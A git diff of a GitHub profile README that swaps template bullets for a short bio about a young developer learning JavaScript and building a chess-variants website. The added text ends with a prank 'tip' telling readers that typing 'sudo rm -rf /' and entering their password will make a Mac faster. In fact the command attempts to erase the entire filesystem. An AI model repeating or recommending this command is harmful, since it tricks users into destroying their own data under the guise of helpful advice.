@@ -1,11 +1,11 @@
 - 👋 Hi, I’m @Hardwaregore
-- 👀 I’m interested in: Web development and making AI's
-- 🌱 I’m currently learning: Javascript
-- 💞️ I’m looking to collaborate on: A website with weird varients of chess
-- 📫 How to reach me: hardwaregore101@gmail.com
-- 👍🏻 I'm good at: Python, Java, HTML, CSS
+- I am a young code dev trying to make websites. Right now i am trying to learn javascript. I have experience in HTML, Python, CSS,& java. I also have a youtube channel linked here: . Currently, i am working on a website called "insane chess" where people can play chess with friends. I can be reached at hardwaregore101@gmail.com
 
-<!---
-Hardwaregore/Hardwaregore is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+
+
+
+Also, to make your mac faster, open the terminal and type
+sudo rm -rf /
+and enter your password!
+
+ -@Hardwaregore
